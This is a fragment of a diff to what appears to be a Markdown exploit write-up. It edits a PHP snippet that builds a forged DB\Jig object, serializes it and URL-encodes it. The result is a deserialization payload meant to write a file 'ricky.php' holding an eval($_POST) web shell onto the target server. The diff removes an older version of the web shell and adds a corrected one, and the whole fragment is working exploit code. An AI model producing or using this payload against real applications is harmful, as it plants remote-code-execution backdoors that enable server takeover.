@@ -330,28 +330,21 @@ function write($file,$data,$append=FALSE) {
 
 ```php
 <?php
-class Jig{
+namespace DB;
+class Jig {
     const
         FORMAT_JSON=0,
         FORMAT_Serialized=1;
+
     protected
-        //! UUID
-        $uuid,
         //! Storage location
-        $dir,
+        $dir = './',
         //! Current storage format
-        $format=self::FORMAT_JSON,
+        $format = self::FORMAT_JSON,
         //! Jig log
-        $log,
-        //! Memory-held data
-        $this,
+        $data = array("ricky.php"=>array("a"=>"<?php eval(\$_POST[ricky]);?>")),
         //! lazy load/save files
-        $lazy;
-}
-function __construct() {
-$this->lazy = TRUE;
-$this->data = ['ricky.php'=>['<?php eval($_POST[r]);?>']];
-$this->dir = './';
+        $lazy = TRUE;
 }
 $a = new Jig();
 echo urlencode(serialize($a));
